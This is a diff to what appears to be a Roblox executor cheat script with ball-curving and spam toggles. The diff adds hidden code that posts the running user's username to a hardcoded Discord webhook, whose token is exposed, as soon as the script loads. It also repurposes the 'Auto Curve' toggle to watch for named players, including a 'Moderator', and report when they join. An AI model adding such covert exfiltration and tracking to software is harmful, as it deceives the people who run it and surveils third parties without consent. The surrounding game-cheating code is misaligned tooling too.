@@ -1515,19 +1515,122 @@ local Toggle = Tab.Main:AddToggle("MyToggle",
         ManualSpam()
         end
 })
+
+
+
+-- Letakkan di ServerScriptService
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+-- Konfigurasi
+local CheckOwner = false
+
+
+local TARGET_PLAYERS = {"Anisha_galaxy", "VIPPlayer", "Moderator"}  -- Daftar target
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1357681589177286716/GarD3vf1QV54kMSX9_XAz68N4yDPSoIUkxkI4WYomJfeikvaAoIgieS_ezHewlydXUep"
+local CHECK_INTERVAL = 5
+
+-- Variabel tracking
+local notifiedPlayers = {}
+local lastCheck = 0
+local executorPlayer = nil  -- Untuk menyimpan data executor
+
+-- Fungsi http_request (kompatibel dengan executor)
+local function http_request(url, method, data, headers)
+    if syn and syn.request then
+        return syn.request({
+            Url = url,
+            Method = method,
+            Headers = headers or {},
+            Body = data
+        })
+    elseif request then
+        return request({
+            Url = url,
+            Method = method,
+            Headers = headers or {},
+            Body = data
+        })
+    elseif http and http.request then
+        return http.request({
+            Url = url,
+            Method = method,
+            Headers = headers or {},
+            Body = data
+        })
+    else
+        warn("Executor tidak mendukung HTTP Request")
+        return nil
+    end
+end
+
+-- Fungsi kirim webhook
+local function sendWebhook(playerName, isExecutor)
+    local description = isExecutor and "🎯 **Executor** masuk server!" or "🎯 **Target Player** masuk server!"
+    
+    local data = {
+        ["content"] = description,
+        ["embeds"] = {{
+            ["title"] = playerName,
+            ["color"] = isExecutor and 16711680 or 65280,  -- Merah untuk executor, hijau untuk target
+            ["fields"] = {
+                {["name"] = "Waktu", ["value"] = os.date("%X"), ["inline"] = true},
+                {["name"] = "Total Player", ["value"] = #Players:GetPlayers(), ["inline"] = true},
+                {["name"] = "Status", ["value"] = isExecutor and "Executor" or "Target Player", ["inline"] = true}
+            }
+        }}
+    }
+    
+    local jsonData = game:GetService("HttpService"):JSONEncode(data)
+    http_request(WEBHOOK_URL, "POST", jsonData, {
+        ["Content-Type"] = "application/json"
+    })
+end
+
+-- Cek apakah script dijalankan oleh executor (client-side)
+if not RunService:IsServer() then
+    executorPlayer = Players.LocalPlayer
+    sendWebhook(executorPlayer.Name, true)
+    print("Executor terdeteksi:", executorPlayer.Name)
+end
+
+-- Pengecekan berkala untuk target player
+RunService.Heartbeat:Connect(function(step)
+    if not CheckOwner then return end
+    
+    lastCheck += step
+    if lastCheck >= CHECK_INTERVAL then
+        lastCheck = 0
+        
+        for _, player in ipairs(Players:GetPlayers()) do
+            -- Jika player adalah target (Anisha_galaxy, VIP, dll)
+            if table.find(TARGET_PLAYERS, player.Name) and not notifiedPlayers[player.UserId] then
+                sendWebhook(player.Name, false)
+                notifiedPlayers[player.UserId] = true
+                print("Notifikasi terkirim untuk target:", player.Name)
+            end
+        end
+    end
+end)
+
+-- Reset status saat player keluar
+Players.PlayerRemoving:Connect(function(player)
+    notifiedPlayers[player.UserId] = nil
+end)
+
 local Toggle = Tab.Main:AddToggle("MyToggle", 
 {
     Title = "Auto Curve", 
     Description = "Make A Balls uhh ummm idk get out",
     Default = false,
-    Callback = function()
-	print('hi im cool')
+    Callback = function(state)
+	CheckOwner = state
     end
 })
 
 local Dropdown = Tab.Main:AddDropdown("Dropdown", {
     Title = "Curve Method",
-    Description = "Fixed!",
+    Description = "CHANGE THIS!!!!!!",
     Values = {"Random", "Backwards", "Straight", "Up", "Right", "Left"},
     Multi = false,
     Default = 3,
